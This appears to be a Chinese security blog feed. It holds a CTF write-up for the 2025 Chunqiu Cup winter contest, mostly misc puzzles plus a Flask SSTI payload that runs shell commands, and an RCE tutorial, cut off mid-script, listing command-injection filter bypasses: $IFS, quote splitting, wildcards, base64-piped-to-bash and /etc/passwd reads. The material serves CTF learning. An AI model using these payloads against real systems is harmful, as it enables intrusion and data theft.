class="comment">//Smarty的&#123;if&#125;条件判断和PHP的if非常相似，只是增加了一些特性。每个&#123;if&#125;必须有一个配对的&#123;/if&#125;，也可以使用&#123;else&#125; 和 &#123;elseif&#125;，全部的PHP条件表达式和函数都可以在if内使用，如||*, or, &amp;&amp;, and, is_array(), 等等，如：&#123;if is_array($array)&#125;&#123;/if&#125;*</span></code></pre><h3 id="twig"><a href="#twig" class="headerlink" title="twig"></a>twig</h3>]]></content>
      
      
      
        <tags>
            
            <tag> -CTF -Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2025春秋杯冬季赛</title>
      <link href="/2025/01/21/2025%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B/"/>
      <url>/2025/01/21/2025%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<p>菜鸟第一次打这种公开赛，感觉被橄榄了，第二天两个pyjail是一点办法都没有啊。。。</p><p>听C3师傅说这还不算是上强度的</p><p>而且准备转型Web却只做出来一个签到属于是。。有点丢人了</p><p>还是要多练，下次努力不啃Misc老底</p><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="简单算术："><a href="#简单算术：" class="headerlink" title="简单算术："></a>简单算术：</h2><p>根据提示，想想异或，直接尝试Cyberchef一把梭</p><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250117150938338.png" alt="image-20250117150938338"></p><h2 id="See-anything-in-these-pics"><a href="#See-anything-in-these-pics" class="headerlink" title="See anything in these pics?"></a>See anything in these pics?</h2><p>附件给了一个压缩包和一张阿兹特克码</p><p>解析得到</p><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250117152921150.png" alt="image-20250117152921150"></p><p>怀疑是压缩包的密码，带入解压压缩包，解压成功，得到一张jpg</p><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/YVL.jpg" alt="YVL"></p><p>看图片结合提示(图片不止两张)猜测一共有三张图，打开010查一下，发现PNG头<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250117153320612.png" alt="image-20250117153320612"></p><p>foremost提取一下发现是全黑的，猜测是crc校验错误，打开010发现报错检验猜想，最后随波逐流直接出(也可以直接随波逐流一把梭)</p><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250117184730714.png" alt="image-20250117184730714"></p><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/00000149-%E4%BF%AE%E5%A4%8D%E9%AB%98%E5%AE%BD.png" alt="00000149-修复高宽"></p><h2 id="压力大，写个脚本吧"><a href="#压力大，写个脚本吧" class="headerlink" title="压力大，写个脚本吧"></a>压力大，写个脚本吧</h2><p>先试着解压几个包，把给的密文base64解码后是FGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFG</p><p>然后发现后面几个包的密文都是一样的，写个脚本直接爆</p><pre><code class="highlight python"><span class="keyword">import</span> zipfile<span class="keyword">import</span> rezipname = <span class="string">&quot;C:\\Users\\ayano\\Desktop\\output\\zip_100\\zip_99.zip&quot;</span><span class="keyword">while</span> <span class="literal">True</span>:    <span class="keyword">if</span> zipname != <span class="string">&quot;C:\\Users\\ayano\\Desktop\\output\\zip_100\\zip_1.zip&quot;</span>:        ts1 = zipfile.ZipFile(zipname)        passwd =<span class="string">b&#x27;FGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFGFG&#x27;</span>        ts1.extractall(<span class="string">&quot;C:\\Users\\ayano\\Desktop\\output\\zip_100\\&quot;</span>,pwd=passwd)        zipname = <span class="string">&quot;C:\\Users\\ayano\\Desktop\\output\\zip_100\\&quot;</span>+ts1.namelist()[<span class="number">0</span>]    <span class="keyword">else</span>:        <span class="built_in">print</span>(<span class="string">&quot;find&quot;</span>)</code></pre><p>结果发现第95包密码换了。解压显示失败，那么直接获取txt的内容解码后解压压缩包。</p><pre><code class="highlight python"><span class="keyword">import</span> zipfile<span class="keyword">import</span> os<span class="keyword">import</span> base64<span class="keyword">def</span> <span class="title function_">decode_password</span>(<span class="params">file_path</span>):    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:        encoded_password = f.read().strip()    decoded_password = base64.b64decode(encoded_password).decode(<span class="string">&#x27;utf-8&#x27;</span>)    <span class="keyword">return</span> decoded_password<span class="keyword">def</span> <span class="title function_">extract_zip</span>(<span class="params">zip_file, password, extract_to</span>):    <span class="keyword">try</span>:        <span class="keyword">with</span> zipfile.ZipFile(zip_file) <span class="keyword">as</span> zf:            zf.extractall(path=extract_to, pwd=password.encode())            <span class="built_in">print</span>(<span class="string">f&quot;解压成功: <span class="subst">&#123;zip_file&#125;</span> 到 <span class="subst">&#123;extract_to&#125;</span>&quot;</span>)            <span class="keyword">return</span> zf.namelist()      <span class="keyword">except</span> (zipfile.BadZipFile, RuntimeError) <span class="keyword">as</span> e:        <span class="built_in">print</span>(<span class="string">f&quot;解压失败: <span class="subst">&#123;zip_file&#125;</span>, 错误: <span class="subst">&#123;e&#125;</span>&quot;</span>)        <span class="keyword">return</span> []<span class="keyword">def</span> <span class="title function_">recursive_extract</span>(<span class="params">start_number=<span class="number">99</span>,parent_dir=<span class="string">&#x27;C:\\Users\\ayano\\Desktop\\output\\zip_100\\&#x27;</span></span>):    current_number = start_number    <span class="keyword">while</span> <span class="literal">True</span>:        zip_filename = <span class="string">f&quot;C:\\Users\\ayano\\Desktop\\output\\zip_100\\zip_<span class="subst">&#123;current_number&#125;</span>.zip&quot;</span>        password_filename = <span class="string">f&quot;C:\\Users\\ayano\\Desktop\\output\\zip_100\\password_<span class="subst">&#123;current_number&#125;</span>.txt&quot;</span>        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(zip_filename):            <span class="built_in">print</span>(<span class="string">f&quot;文件不存在: <span class="subst">&#123;zip_filename&#125;</span>&quot;</span>)            <span class="keyword">break</span>        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(password_filename):            <span class="built_in">print</span>(<span class="string">f&quot;密码文件不存在: <span class="subst">&#123;password_filename&#125;</span>&quot;</span>)            <span class="keyword">break</span>        password = decode_password(password_filename)        extracted_files = extract_zip(zip_filename, password,parent_dir)        <span class="keyword">if</span> <span class="keyword">not</span> extracted_files:            <span class="keyword">break</span>        next_zip_file = <span class="literal">None</span>        <span class="keyword">for</span> extracted_file <span class="keyword">in</span> extracted_files:            <span class="keyword">if</span> extracted_file.endswith(<span class="string">&#x27;.zip&#x27;</span>):                next_zip_file = extracted_file                <span class="keyword">break</span>        <span class="keyword">if</span> next_zip_file <span class="keyword">is</span> <span class="literal">None</span>:            <span class="keyword">break</span>        current_number -= <span class="number">1</span><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:    recursive_extract()</code></pre><p>解码后得到hint<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250117181031624.png" alt="image-20250117181031624"></p><p>应该是让我们把每个压缩包的密码解码后组成hex码产生一个png图片</p><p>根据我们第一个密码FG…..，显然不是文件头的格式，那么从0开始到99提取文件内容</p><pre><code class="highlight python"><span class="keyword">import</span> os<span class="keyword">import</span> base64<span class="keyword">def</span> <span class="title function_">decode_password</span>(<span class="params">file_path</span>):    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:        encoded_password = f.read().strip()    decoded_password = base64.b64decode(encoded_password).decode(<span class="string">&#x27;utf-8&#x27;</span>)    <span class="keyword">return</span> decoded_password<span class="keyword">def</span> <span class="title function_">extract_decoded_passwords</span>(<span class="params">start_number=<span class="number">0</span>, output_file=<span class="string">&#x27;decoded_passwords.txt&#x27;</span></span>):    <span class="keyword">with</span> <span class="built_in">open</span>(output_file, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> output_f:        current_number = start_number        <span class="keyword">while</span> <span class="literal">True</span>:            password_filename = <span class="string">f&quot;C:\\Users\\ayano\\Desktop\\output\\zip_100\\password_<span class="subst">&#123;current_number&#125;</span>.txt&quot;</span>            <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(password_filename):                <span class="built_in">print</span>(<span class="string">f&quot;密码文件不存在: <span class="subst">&#123;password_filename&#125;</span>&quot;</span>)                <span class="keyword">break</span>            decoded_password = decode_password(password_filename)            output_f.write(<span class="string">f&quot;<span class="subst">&#123;decoded_password&#125;</span>&quot;</span>)            <span class="built_in">print</span>(<span class="string">f&quot;密码_<span class="subst">&#123;current_number&#125;</span> 解码并保存。&quot;</span>)            current_number += <span class="number">1</span><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:    extract_decoded_passwords(start_number=<span class="number">0</span>, output_file=<span class="string">&#x27;C:\\Users\\ayano\\Desktop\\1.txt&#x27;</span>)</code></pre><p>最终得到的在010中粘贴为hex码，得到一个二维码，扫一下</p><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250117181408150.png"></p><h2 id="Infinity"><a href="#Infinity" class="headerlink" title="Infinity"></a>Infinity</h2><p>首先看提示是不知道有什么用的</p><p>拿到一张png，用010查一下看到zip头</p><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250119164920069.png" alt="image-20250119164920069"></p><p>foremost提取一下</p><p>得到一个压缩包，在解压几次后发现是个嵌套的压缩包</p><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250119165111733.png" alt="image-20250119165111733">一共有7z,tar,zip三种类型的压缩包</p><p>同时注意到文件名有点可疑，留意一下，可能后续要用</p><p>脚本：</p><pre><code class="highlight plaintext">import osimport zipfileimport tarfileimport py7zrimport shutildef extract_zip(zip_path, extract_dir):    &quot;&quot;&quot;解压zip文件&quot;&quot;&quot;    with zipfile.ZipFile(zip_path, &#x27;r&#x27;) as zip_ref:        zip_ref.extractall(extract_dir)        return zip_ref.namelist()  # 返回解压出来的文件列表def extract_tar(tar_path, extract_dir):    &quot;&quot;&quot;解压tar文件&quot;&quot;&quot;    with tarfile.open(tar_path, &#x27;r&#x27;) as tar_ref:        tar_ref.extractall(extract_dir)        return tar_ref.getnames()  # 返回解压出来的文件列表def extract_7z(archive_path, extract_dir):    &quot;&quot;&quot;解压7z文件&quot;&quot;&quot;    with py7zr.SevenZipFile(archive_path, mode=&#x27;r&#x27;) as archive_ref:        archive_ref.extractall(extract_dir)        return archive_ref.getnames()  # 返回解压出来的文件列表def handle_compressed_file(file_path, extract_dir, output_txt):    &quot;&quot;&quot;处理压缩包文件：解压并记录文件名（去掉后缀并连接）&quot;&quot;&quot;    if file_path.endswith(&#x27;.zip&#x27;):        extracted_files = extract_zip(file_path, extract_dir)    elif file_path.endswith(&#x27;.tar&#x27;):        extracted_files = extract_tar(file_path, extract_dir)    elif file_path.endswith(&#x27;.7z&#x27;):        extracted_files = extract_7z(file_path, extract_dir)    else:        print(f&quot;不支持的压缩格式：&#123;file_path&#125;&quot;)        return []    # 记录去掉后缀并连接的文件名    with open(output_txt, &#x27;a&#x27;) as output_file:        for file_name in extracted_files:            name_without_extension = os.path.splitext(file_name)[0]  # 去掉后缀            output_file.write(f&quot;&#123;name_without_extension&#125;\n&quot;)    return extracted_filesdef process_zip(zip_path, extract_dir, output_txt):    &quot;&quot;&quot;处理zip文件并递归解压其中的压缩包&quot;&quot;&quot;    # 解压当前zip文件并返回解压后的文件列表    extracted_files = extract_zip(zip_path, extract_dir)    for extracted_file in extracted_files:        extracted_file_path = os.path.join(extract_dir, extracted_file)        if os.path.isdir(extracted_file_path):            continue  # 跳过目录        # 如果解压出来的是压缩包，再进行递归处理        if extracted_file.endswith((&#x27;.zip&#x27;, &#x27;.tar&#x27;, &#x27;.7z&#x27;)):            # 解压嵌套压缩包并处理            handle_compressed_file(extracted_file_path, extract_dir, output_txt)            # 如果是嵌套的压缩包，再递归调用            if extracted_file.endswith(&#x27;.zip&#x27;):                process_zip(extracted_file_path, extract_dir, output_txt)            elif extracted_file.endswith(&#x27;.tar&#x27;):                process_tar(extracted_file_path, extract_dir, output_txt)            elif extracted_file.endswith(&#x27;.7z&#x27;):                process_7z(extracted_file_path, extract_dir, output_txt)        else:            handle_compressed_file(extracted_file_path, extract_dir, output_txt)    # 删除当前处理的压缩包    if zip_path.endswith(&#x27;.zip&#x27;):        os.remove(zip_path)def process_tar(tar_path, extract_dir, output_txt):    &quot;&quot;&quot;处理tar文件并递归解压其中的压缩包&quot;&quot;&quot;    extracted_files = extract_tar(tar_path, extract_dir)    for extracted_file in extracted_files:        extracted_file_path = os.path.join(extract_dir, extracted_file)        if os.path.isdir(extracted_file_path):            continue        if extracted_file.endswith((&#x27;.zip&#x27;, &#x27;.tar&#x27;, &#x27;.7z&#x27;)):            handle_compressed_file(extracted_file_path, extract_dir, output_txt)            if extracted_file.endswith(&#x27;.zip&#x27;):                process_zip(extracted_file_path, extract_dir, output_txt)            elif extracted_file.endswith(&#x27;.tar&#x27;):                process_tar(extracted_file_path, extract_dir, output_txt)            elif extracted_file.endswith(&#x27;.7z&#x27;):                process_7z(extracted_file_path, extract_dir, output_txt)    # 删除当前处理的压缩包    if tar_path.endswith(&#x27;.tar&#x27;):        os.remove(tar_path)def process_7z(archive_path, extract_dir, output_txt):    &quot;&quot;&quot;处理7z文件并递归解压其中的压缩包&quot;&quot;&quot;    extracted_files = extract_7z(archive_path, extract_dir)    for extracted_file in extracted_files:        extracted_file_path = os.path.join(extract_dir, extracted_file)        if os.path.isdir(extracted_file_path):            continue        if extracted_file.endswith((&#x27;.zip&#x27;, &#x27;.tar&#x27;, &#x27;.7z&#x27;)):            handle_compressed_file(extracted_file_path, extract_dir, output_txt)            if extracted_file.endswith(&#x27;.zip&#x27;):                process_zip(extracted_file_path, extract_dir, output_txt)            elif extracted_file.endswith(&#x27;.tar&#x27;):                process_tar(extracted_file_path, extract_dir, output_txt)            elif extracted_file.endswith(&#x27;.7z&#x27;):                process_7z(extracted_file_path, extract_dir, output_txt)    # 删除当前处理的压缩包    if archive_path.endswith(&#x27;.7z&#x27;):        os.remove(archive_path)def main():    zip_path = r&#x27;C:\Users\ayano\Desktop\output\Infinity\output\zip\1.zip&#x27;    extract_dir = r&#x27;C:\Users\ayano\Desktop\output\Infinity\output\zip\extracted&#x27;    output_txt = r&#x27;C:\Users\ayano\Desktop\output\Infinity\output\zip\output.txt&#x27;    if not os.path.exists(extract_dir):        os.makedirs(extract_dir)    # 开始处理压缩包    with open(output_txt, &#x27;w&#x27;) as output_file:        output_file.write(&quot;&quot;)    process_zip(zip_path, extract_dir, output_txt)if __name__ == &quot;__main__&quot;:    main()</code></pre><p>再对提出来的文件名做两种处理</p><pre><code class="highlight plaintext">def reverse_file_names(input_txt, output_txt):    &quot;&quot;&quot;读取文件名并将其从后往前连接&quot;&quot;&quot;    with open(input_txt, &#x27;r&#x27;) as infile:        file_names = infile.readlines()    # 去掉换行符并从后往前连接    reversed_file_names = [name.strip() for name in reversed(file_names)]    # 将连接后的文件名写入新文件    with open(output_txt, &#x27;w&#x27;) as outfile:        outfile.write(&quot;连接后的文件名（从后往前）：\n&quot;)        outfile.write(&quot;&quot;.join(reversed_file_names))  # 使用空格连接文件名def remove_newlines_and_connect(input_txt, output_txt):    &quot;&quot;&quot;读取文件名并去掉换行符，连接所有文件名&quot;&quot;&quot;    with open(input_txt, &#x27;r&#x27;) as infile:        # 读取所有行并去掉换行符        file_names = infile.read().splitlines()    # 将文件名用空格连接    connected_file_names = &quot;&quot;.join(file_names)    # 将连接后的文件名写入新文件    with open(output_txt, &#x27;w&#x27;) as outfile:        outfile.write(&quot;连接后的文件名（去掉换行符）：\n&quot;)        outfile.write(connected_file_names)  # 直接写入连接后的字符串def main():    input_txt = r&#x27;C:\Users\ayano\Desktop\output\Infinity\output\zip\output.txt&#x27;    output1_txt = r&#x27;C:\Users\ayano\Desktop\output\Infinity\output\zip\output_reversed.txt&#x27;    output2_txt = r&#x27;C:\Users\ayano\Desktop\output\Infinity\output\zip\output_simple.txt&#x27;    reverse_file_names(input_txt, output1_txt)    remove_newlines_and_connect(input_txt, output2_txt)if __name__ == &quot;__main__&quot;:    main()</code></pre><p>根据提示BASE58-Ripple、SM4-ECB</p><p>先后尝试顺序的和逆序的</p><p>最后逆序的得到以下</p><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250119165516321.png" alt="image-20250119165516321"></p><p>看一眼是png的文件头，在010以16进制粘贴得到一张图片</p><p><img src="/2025/01/21/2025%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B/Users/ayano/Desktop/flag2.png" alt="flag"></p><p>在谷歌搜图后判断出是 DataMatrix码</p><p>在线工具解决 <img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250119170503355.png" alt="image-20250119170503355"></p><h2 id="音频的秘密"><a href="#音频的秘密" class="headerlink" title="音频的秘密"></a>音频的秘密</h2><p>解压得到一个wav文件</p><p>根据提示deepsound和弱口令</p><p>试一下123？</p><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250119181253709.png" alt="image-20250119181253709"></p><p>运气比较好直接出来了</p><p>提取zip后发现需要密码打开</p><p>在010查过之后发现是真加密<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250119181451213.png" alt="image-20250119181451213"></p><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250119181524239.png" alt="image-20250119181524239"></p><p>没有提示，直接尝试明文爆破，已知png文件头，以这个为明文开始爆</p><pre><code class="highlight bash"><span class="built_in">echo</span> 89504E470D0A1A0A0000000D49484452 | xxd -r -ps &gt; png_headerbkcrack -C flag.zip -c flag.png -p png_header -o 0</code></pre><p>然后得到密钥 <code>29d29517 0fa535a9 abc67696</code></p><pre><code class="highlight bash">bkcrack -C flag.zip -c flag.png -k 29d29517 0fa535a9 abc67696 -d flag.png</code></pre><p>得到flag.png</p><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/flag.png" alt="flag">通过stegsolve看一下有没有lsb隐写</p><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/893940eded9dc333fe7e104a38fccaf5.png" alt="893940eded9dc333fe7e104a38fccaf5"></p><p>左上角一看肯定有lsb稳了，zsteg一跑</p><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250119203932034.png" alt="image-20250119203932034"></p><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="easy-flask"><a href="#easy-flask" class="headerlink" title="easy_flask"></a>easy_flask</h2><p>根据提示想想flask,应该是SSTI漏洞</p><p>先试着打一下，看看有没有绕过</p><pre><code class="highlight plaintext">&#123;&#123; config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read() &#125;&#125;</code></pre><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250117162602849.png" alt="image-20250117162602849"></p><p>直接爆了，那就ls换cat flag解决</p><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250117162704054.png" alt="image-20250117162704054"></p>]]></content>
      
      
      
        <tags>
            
            <tag> -CTF -misc -WP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RCE</title>
      <link href="/2025/01/21/RCE/"/>
      <url>/2025/01/21/RCE/</url>
      
        <content type="html"><![CDATA[<h1 id="RCE（远程代码执行漏洞）原理及漏洞相关"><a href="#RCE（远程代码执行漏洞）原理及漏洞相关" class="headerlink" title="RCE（远程代码执行漏洞）原理及漏洞相关"></a>RCE（远程代码执行漏洞）原理及漏洞相关</h1><p>RCE，Romote Code Execution漏洞，即通过向后台服务器远程注入系统命令或代码来控制后台系统</p><p><strong>系统命令执行函数</strong></p><pre><code class="highlight plaintext">*** system() 语法为system(string $command, int &amp;$return var = ?)*** passthru() system()的平替，写个命令就会执行命令，自己能回显*** exec() 示例exec(&quot;cat /flag&quot;)，其本身没有回显*** shell_exec() 格式分别为shell_exec（ls）和`ls`,不能自己回显，需要借用echo\print等输出结果*** popen() 语法为popen(string $command, string $mode),command参数: 要执行的命令,mode参数: 模式&#x27;r&#x27;表示阅读，&#x27;w&#x27; 表示写入。不能自己回显，需要print_r等输出内容*** proc_open() 语法为proc_open($command,$descriptor spec,$pipes,$cwd,$env vars,$options)$command是要执行的命令。$descriptorspec是一个描述符规范数组，用于指定进程的输入、输出和错误的文件描述符。$pipes是一个引用变量，用于存储与进程相关的管道。$cwd（可选）是设置子进程的当前工作目录。$env（可选）是设置子进程的环境变量。$other_options（可选）是其他选项，如设置超时等不能直接回显*** pcntl_exec()  语法格式为pcntl exec(string $path, array $args = ?, array $envs = ?)path必须时可执行二进制文件路径或一个在文件第一行指定了 一个可执行文件路径标头的脚本 (比如文件第一行是#!/usr/local/bin/perl的perl脚本)。args是一个要传递给程序的参数的字符串数组。envs是一个要传递给程序作为环境变量的字符串数组。这个数组是 key =&gt; value格式的，key代表要传递的环境变量的名称，value代表该环境变量值。该函数没有回显，解决方法一：cat文件并输出到有权限读取路径；解决方法二：shell反弹</code></pre><p>那么如果遇到类似PING的执行漏洞，如何将前面的字段和系统命令无缝衔接呢？</p><p>那么就需要管道符来支持：</p><p>*<strong>关于管道符</strong></p><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/803305e48f88c6e5804f38315b798f21.png" alt="img"></p><p><strong>For Windows：</strong></p><p>“|” : 直接执行后面的语句。例如：<code>ping 127.0.0.1| whoami</code><br>“||” : 如果前面执行的语句执行出错，则执行后面的语句，否则只执行前面的语句。例如： <code>ping 1234.1 || whoami</code><br>“&amp;” : 如果前面的语句为假则直接执行后面的语句，前面的语句可真可假 。例如： <code>ping 127.0.0.1 &amp; whoami</code><br>“&amp;&amp;” : 如果前面的语句为假则直接出错，也不执行后面的语句，前面的语句只能为真。例如： <code>ping 127.0.0.1 &amp;&amp; whoami</code></p><p><strong>For Linux:</strong></p><p>“;” : 执行完前面的语句再执行后面的。 例如： <code>ping 127.0.0.1 ; whoami</code><br>“|” : 显示后面语句的执行结果。列如：<code>ping 127.0.0.1 | whoami</code><br>“||” : 当前的语句执行出错时，执行后面的语句。 例如： <code>ping 1472.1 || whoami</code><br>“&amp;” : 如果前面得语句为假则直接执行后面的语句，前面的语句可真可假，例如：<code>ping 127.0.0.1 | &amp; whoami</code><br>“&amp;&amp;” : 如果前面的语句为假则直接出错，也不执行后面的，前面的语句只能为真。例如： <code>ping 127.0.0.1 &amp;&amp; whoami</code></p><p>发现漏洞后，如何得到控制权呢？</p><p>最简单的漏洞就是找到注入点直接注</p><p>但是难免会碰到存在黑名单的情况，这个时候就需要绕过出场了</p><h2 id="空格过滤绕过："><a href="#空格过滤绕过：" class="headerlink" title="空格过滤绕过："></a>空格过滤绕过：</h2><h3 id="大括号-："><a href="#大括号-：" class="headerlink" title="大括号{}："></a>大括号{}：</h3><pre><code class="highlight plaintext">&#123;cat,flag.php&#125;</code></pre><h3 id="IFS代替空格："><a href="#IFS代替空格：" class="headerlink" title="$IFS代替空格："></a><code>$IFS</code>代替空格：</h3><p><code>$IFS$9</code>，<code>$&#123;IFS&#125;</code>，<code>$IFS</code>这三个都行</p><p>Linux下有一个特殊的环境变量叫做IFS，叫做内部字段分隔符 (internal field separator)。</p><pre><code class="highlight plaintext">?cmd=ls$IFS-I</code></pre><p>单纯$IFS2,IFS2被bash解释器当做变量名，输不出来结果，加一个{}就固定了变量名</p><pre><code class="highlight plaintext">?cmd=ls$&#123;IFS&#125;-l</code></pre><p>$IFS$9后面加个$与{}类似，起截断作用，$9是当前系统shell进程第九个参数持有者始终为空字符串。</p><pre><code class="highlight plaintext">?cmd=ls$&#123;IFS&#125;$9-l</code></pre><h3 id="重定向字符"><a href="#重定向字符" class="headerlink" title="重定向字符&lt;，&lt;&gt;"></a>重定向字符&lt;，&lt;&gt;</h3><p>(具体哪种情景能用还不太清楚)</p><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>%20绕过(相当于url编码的空格)</p><p>%09绕过（相当于Tab键）</p><p>%0a–代表换行符</p><p>%0b–用于在输出或显示文本时在该位置产生一个固定的垂直间距，类似于tab键。</p><p>%0d–回车换行</p><p>%a0–代表的是非断行空格</p><p>%00–%00代表的是ASCII码中的空字符</p><p>可以将空格字符替换成注释&#x2F;**&#x2F;，也可以使用内联注释<code>/!code/</code>        </p><p>内联注释绕过知识点</p><pre><code>    当一些关键语句被过滤时，内联注释就是把一些特有的仅在 mysql 上的语句放在 /*!  */中，这样这些语句如果在其它数据库中是不会被执行，但在 mysql 中会执行</code></pre><h2 id="文件名过滤绕过："><a href="#文件名过滤绕过：" class="headerlink" title="文件名过滤绕过："></a>文件名过滤绕过：</h2><h3 id="绕过"><a href="#绕过" class="headerlink" title="??,*绕过"></a>??,*绕过</h3><p><code>passthru</code>代替<code>system</code>，过滤flag文件名用?，*绕过</p><pre><code class="highlight plaintext">cat /fl??cat /f*  #多个匹配结果同时展现</code></pre><p>以上指令等效于<code>cat /flag</code></p><h3 id="过滤"><a href="#过滤" class="headerlink" title=";过滤"></a>;过滤</h3><p>利用?&gt;绕过</p><h3 id="单引号-‘-双引号-“”-反引号-绕过正则"><a href="#单引号-‘-双引号-“”-反引号-绕过正则" class="headerlink" title="单引号(‘)双引号(“”)反引号(&#96;&#96;)绕过正则"></a>单引号(‘)双引号(“”)反引号(&#96;&#96;)绕过正则</h3><pre><code class="highlight plaintext">cat /fl&quot;&quot;agc&quot;&quot;at /e&#x27;t&#x27;c/pas``s``wd</code></pre><p>对<code>php</code>来说这是<code>fl&quot;&quot;ag</code>而不是<code>flag</code>关键字不会匹配上，但是对于linux系统来说<code>cat /fl&quot;&quot;ag</code>等效于<code>cat /flag</code>。外面包裹的是单引号里面就是双引号，外面包裹的是双引号里面就是单引号，或者用斜线\去掉功能性，避免报错</p><pre><code class="highlight plaintext">passthru(&#x27;cat /fl&quot;&quot;ag.p\&#x27;\&#x27;hp&#x27;)</code></pre><h3 id="反斜杠-绕过"><a href="#反斜杠-绕过" class="headerlink" title="反斜杠\绕过"></a>反斜杠\绕过</h3><p>\特殊字符去掉功能性，单纯表示为字符串，而linux看到反斜线\会自动帮你去掉,正常执行命令</p><pre><code class="highlight plaintext">cat fl\ag.p\hp</code></pre><h3 id="特殊变量：-1到-9、-和"><a href="#特殊变量：-1到-9、-和" class="headerlink" title="特殊变量：$1到$9、$@和$*"></a>特殊变量：$1到$9、$@和$*</h3><p>这些特殊变量输出为空</p><pre><code class="highlight plaintext">cat /fl$9agcat /fl$@ag</code></pre><p>或者在单词结尾处插入$x，这里的x可以是任意字母，例如可以写成如下形式：</p><pre><code class="highlight plaintext">c$@at /e$@tc/pas$@swdcat$x /etc$x/passwd$xca$@t /etc$x/passwd$x</code></pre><h3 id="内联执行绕过（通过赋值绕过）"><a href="#内联执行绕过（通过赋值绕过）" class="headerlink" title="内联执行绕过（通过赋值绕过）"></a>内联执行绕过（通过赋值绕过）</h3><p>a&#x3D;c;b&#x3D;a;c&#x3D;t;$a$b$c &#x2F;1.txt</p><p>a&#x3D;f;c&#x3D;a;d&#x3D;g;b&#x3D;l;cat $a$b$c$d.php（abcd拼接出来flag）</p><h3 id="利用linux中的环境变量"><a href="#利用linux中的环境变量" class="headerlink" title="利用linux中的环境变量"></a>利用linux中的环境变量</h3><p>使用环境变量里的字符执行变量</p><p>echo $PATH              #PATH默认系统环境变量</p><p>如果出现：</p><pre><code class="highlight bash">/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin</code></pre><p>则以下代码表示了flag.php</p><pre><code class="highlight plaintext">echo f$&#123;PATH:5:1&#125;$&#123;PATH:8:1&#125;$&#123;PATH:66:1&#125;.$&#123;PATH:93:1&#125;h$&#123;PATH:93:1&#125;</code></pre><p>比如${PATH:5:1}指的是取路径的第五位（从0开始数，第0位是&#x2F;）的字符，步长为1，即只取一个字母l，以此类推就能拼接成关键字<code>flag.php</code></p><h2 id="常见文件读取命令绕过："><a href="#常见文件读取命令绕过：" class="headerlink" title="常见文件读取命令绕过："></a>常见文件读取命令绕过：</h2><h3 id="base64编码："><a href="#base64编码：" class="headerlink" title="base64编码："></a>base64编码：</h3><pre><code class="highlight plaintext">cat flag.php--&gt; Y2FOIGZSYWcucGhwecho Y2FOIGZsYWcucGhw | base64 -d</code></pre><p>管道符|把前面指令执行的结果，变成后面指令的参数，所以这里会解码读取命令</p><p>执行命令的话有三种形式：</p><pre><code class="highlight plaintext">echo Y2FOIGZsYWcucGhw | base64 -d | bash$(echo Y2FOIGZsYWcucGhw | base64 -d)`echo Y2FOIGZsYWcucGhw | base64 -d`   #反引号</code></pre><p> 把<code>cat flag.php</code>，放在bash里执行，同理想换成什么命令就base64编码后替换</p><h3 id="base32编码同理"><a href="#base32编码同理" class="headerlink" title="base32编码同理"></a>base32编码同理</h3><pre><code class="highlight plaintext">?cmd=system(&#x27;echo &quot;MNQXIIDGNRQWOLTQNBYA====&quot;|base32 -d|/bin/bash&#x27;);</code></pre><h3 id="HEX编码（ASCII编码）"><a href="#HEX编码（ASCII编码）" class="headerlink" title="HEX编码（ASCII编码）"></a>HEX编码（ASCII编码）</h3><h4 id="python脚本"><a href="#python脚本" class="headerlink" title="python脚本"></a>python脚本</h4><pre><code class="highlight plaintext">import binasciis = 